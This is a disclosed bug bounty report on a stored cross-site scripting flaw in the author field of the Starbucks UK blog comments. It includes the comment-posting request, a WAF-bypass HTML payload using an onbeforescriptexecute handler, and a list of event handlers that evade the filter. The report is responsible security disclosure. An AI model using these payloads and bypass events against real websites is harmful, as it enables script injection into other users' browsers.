# Stored XSS in comments on https://www.starbucks.co.uk/blog/*

## Report Details
- **Report ID**: 218226
- **URL**: https://hackerone.com/reports/218226
- **State**: Closed
- **Severity**: high
- **Submitted**: 2017-04-02T23:18:08.913Z
- **Disclosed**: 2017-06-27T17:13:40.679Z

## Reporter
- **Username**: bayotop
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: starbucks

## Vulnerability Information
Hi,

there are a lot of published blog post under https://www.starbucks.co.uk/blog/*. You can find plenty of them using this google dork `site:www.starbucks.co.uk inurl:blog/`. Notice the comments functionality at the bottom at the page.

When a comment is sent the following request is made:
```http
POST /blog/addcomment HTTP/1.1
Host: www.starbucks.co.uk
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0
Accept: text/html, */*; q=0.01
Accept-Language: en-US,en;q=0.5
X-NewRelic-ID: VQUHVlNSARACV1JSBAIGVA==
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Referer: https://www.starbucks.co.uk/blog/setting-the-record-straight-on-starbucks-uk-taxes-and-profitability
Content-Length: 321
Cookie: [redacted]
Connection: close

Body=Nice&ParentId=0&PostID=1241&author=ope67164%40disaq.com
```
The values of the `Body` and `author` parameters will be rendered into the page as a new comment. The value from the `author` parameter is not correctly encoded. This allows to inject arbitrary valid HTML.

You seem to be using a WAF which will block request (500) containing `<script></script>` and various input matching `on*=`.  However, I managed to find a bypass:

```html
</li></ul></li></ul></div></div></div></div><test/onbeforescriptexecute=confirm`h1poc`>
```

This will work on latest FF as can be seen here: https://www.starbucks.co.uk/blog/setting-the-record-straight-on-starbucks-uk-taxes-and-profitability

Note that the closing tags are just to make the script execute (I'm sorry for the multiple payloads on that site, once the above comment was sent, all previous attempts started to work. Would be great if you could clean up the comments at the end).

Here is a list of all potential `on*=` events I could find, that will bypass your WAF an can be used to create cross-browser payloads:

```
onsearch
onwebkitanimationiteration
onwebkitanimationstart
onanimationiteration
onwebkitanimationend
onanimationstart
ondataavailable
ontransitionend
onanimationend
onreceived
onpopstate
```

To fix this issue make sure the `author` value is correctly encoded. It could be also taken from the current user's session instead of the POST data. Also I recommend adding the aforementioned events to your WAF blacklist.

Please let me know in case you need any more information from my side. 

## Attachments
No attachments
